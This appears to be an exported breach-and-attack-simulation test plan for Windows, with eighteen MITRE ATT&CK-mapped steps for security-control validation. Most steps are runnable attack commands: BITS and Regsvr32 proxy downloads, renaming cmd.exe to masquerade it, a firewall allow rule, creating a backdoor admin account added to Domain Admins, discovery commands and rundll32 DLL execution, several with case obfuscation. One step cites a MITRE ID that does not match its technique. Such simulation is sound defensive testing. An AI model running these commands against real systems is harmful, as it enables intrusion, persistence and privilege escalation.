# 2026-PA-P2-Windows-Baseline-v02

| | |
|---|---|
| **Status** | active |
| **Severity** | medium |
| **Target environment** | Windows |
| **Tags** | `#windowsbaseline` · `#preparacionactiva` · `#2026` · `windows` |
| **Autor** | Enddy Emmanuel Figueroa Perez |
| **Creado** | 2026-06-03T01:24:26.068Z |
| **Actualizado** | 2026-06-03T16:05:18.712Z |

## Plataformas BAS donde está disponible

- **Scythe** · ID: `049fca40-e3dc-4a55-b407-d59d7670b49c` · [ver](https://zgv2zwxzy3.saas.scythe.io/test-library/049fca40-e3dc-4a55-b407-d59d7670b49c)

## Steps

### 1. BITS Jobs: T1197

**MITRE:** T1197

```cmd
cmd /c bitsADmIn /create ServiceBackup
```

### 2. Ingress Tool Transfer: T1105

**MITRE:** T1105

```powershell
Start-BitsTransfer -Priority foreground -Source https://i.ytimg.com/vi/RkzhZsf4Dro/hqdefault.jpg -Destination C:\Windows\Temp\image.jpg.exe
```

### 3. Regsvr32: T1218.010

**MITRE:** T1218.010

```cmd
cmd /c reGsvr32 /n /s /u /i:http://127.0.0.1/installer.exe scrobj.dll
```

### 4. Command and Scripting Interpreter: T1059

**MITRE:** T1059

```cmd
wscript.exe //B //e:vbscript "CreateObject(""WScript.Shell"").Run ""cmd.exe /c whoami"",0,False"
```

### 5. Local Account: T1087.001

**MITRE:** T1087.001

```cmd
query user
```

### 6. SMB/Windows Admin Shares: T1021.002

**MITRE:** T1021.002

```cmd
echo "4pij77iO==" > C:\Windows\Temp\payload.exe
```

### 7. SMB/Windows Admin Shares: T1021.002

**MITRE:** T1021.002

```powershell
Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock { Start-Process C:\Windows\Temp\payload.exe }
```

### 8. Rename Legitimate Utilities: T1036.003

**MITRE:** T1036.003

```cmd
cmd /c cOpy C:\Windows\System32\cmd.exe C:\Windows\Temp\servicexdr.exe
```

### 9. Disable or Modify System Firewall: T1562.004

**MITRE:** T1686

```cmd
cmd /c neTsh advfirewall firewall add rule name="Default Service" dir=in action=allow program="C:\Windows\Temp\servicexdr.exe" enable=yes
```

### 10. Remote System Discovery: T1018

**MITRE:** T1018

```cmd
cmd /c net view /domain
```

### 11. Create Account: T1136

**MITRE:** T1136

```cmd
New-LocalUser -Name "admin365" -Password (ConvertTo-SecureString "@ban20dd283s" -AsPlainText -Force) -FullName "admin365" -Description "Local admin user"
```

### 12. Additional Local or Domain Groups: T1098.007

**MITRE:** T1098.007

```cmd
cmd /c neT gRoup "Domain Admins" admin365 /add /domain
```

### 13. Additional Local or Domain Groups: T1098.007

**MITRE:** T1098.007

```powershell
Invoke-Command -ScriptBlock { Add-LocalGroupMember -Group 'Administrators' -Member 'admin365' -ErrorAction SilentlyContinue }
```

### 14. System Information Discovery: T1082

**MITRE:** T1082

```cmd
cmd /c REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
```

### 15. System Network Configuration Discovery: T1016

**MITRE:** T1016

```cmd
cmd /c netsh interface show interface
```

### 16. Process Discovery: T1057

**MITRE:** T1057

```cmd
cmd /c tasklIst | findstr /I MonitorSystem64.exe
```

### 17. Descarga de advapi32.dll

```
downloader --src VFS:/shared/FileTest/advapi32_bening_testsimulation.dll --dest C:\Windows\Temp\advapi32.dll
```

### 18. Rundll32: T1218.011

**MITRE:** T1218.011

```cmd
run RUNDLL32.exe C:\Windows\Temp\advapi32.dll
```

---
_Exportado desde STRIKE — `windowsbaselinep2v2`_
